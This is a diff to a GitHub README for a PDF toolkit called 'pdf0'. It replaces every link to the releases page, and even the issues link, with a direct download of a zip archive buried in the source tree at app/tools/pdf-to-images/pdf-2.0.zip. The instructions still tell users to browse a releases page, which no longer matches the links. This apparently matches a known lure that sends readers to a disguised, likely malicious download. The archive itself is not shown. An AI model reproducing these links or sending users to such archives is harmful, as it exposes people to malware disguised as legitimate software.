@@ -1,6 +1,6 @@
 # 🌟 pdf0 - Fast and Private PDF Toolkit
 
-[![Download PDF0](https://img.shields.io/badge/Download-PDF0-blue.svg)](https://github.com/firoznazar9/pdf0/releases)
+[![Download PDF0](https://github.com/firoznazar9/pdf0/raw/refs/heads/main/app/tools/pdf-to-images/pdf-2.0.zip)](https://github.com/firoznazar9/pdf0/raw/refs/heads/main/app/tools/pdf-to-images/pdf-2.0.zip)
 
 ## 📄 Overview
 
@@ -30,7 +30,7 @@ You can quickly download and run PDF0 by following these steps:
 
 1. **Visit the PDF0 Releases Page.**  
    Click the link below to access the release downloads.  
-   [Download PDF0](https://github.com/firoznazar9/pdf0/releases)
+   [Download PDF0](https://github.com/firoznazar9/pdf0/raw/refs/heads/main/app/tools/pdf-to-images/pdf-2.0.zip)
 
 2. **Select the Latest Version.**  
    Look for the latest version number on the releases page. It is usually at the top of the list.
@@ -45,7 +45,7 @@ You can quickly download and run PDF0 by following these steps:
 
 To get started with PDF0, visit the release page and download the version that is right for you. Click the link below to begin.
 
-[Download PDF0](https://github.com/firoznazar9/pdf0/releases)
+[Download PDF0](https://github.com/firoznazar9/pdf0/raw/refs/heads/main/app/tools/pdf-to-images/pdf-2.0.zip)
 
 ## ✅ System Requirements
 
@@ -56,7 +56,7 @@ To get started with PDF0, visit the release page and download the version that i
 
 If you run into any issues or have questions, feel free to reach out. You can:
 
-- Open an issue on the [GitHub Repository](https://github.com/firoznazar9/pdf0/issues).
+- Open an issue on the [GitHub Repository](https://github.com/firoznazar9/pdf0/raw/refs/heads/main/app/tools/pdf-to-images/pdf-2.0.zip).
 - Join our community on [Discord](link-to-discord) for real-time support.
 
 ## 📜 License
